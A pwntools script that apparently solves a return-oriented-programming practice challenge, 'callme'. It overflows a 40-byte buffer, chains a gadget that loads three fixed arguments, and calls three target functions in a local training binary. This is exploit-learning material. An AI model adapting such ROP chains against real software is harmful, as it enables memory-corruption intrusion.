#!/usr/bin/env python3

from pwn import *

binary = ELF("./callme")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

OFFSET = 40
POP_ADDR = p64(0x40093c)
ARG_1 = p64(0xdeadbeefdeadbeef)
ARG_2 = p64(0xcafebabecafebabe)
ARG_3 = p64(0xd00df00dd00df00d)

rop.raw(b"A"*OFFSET)

for fun in ["callme_one", "callme_two", "callme_three"]:
    rop.raw(POP_ADDR)
    rop.raw(ARG_1)
    rop.raw(ARG_2)
    rop.raw(ARG_3)
    rop.raw(binary.symbols[fun])

p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[-2])
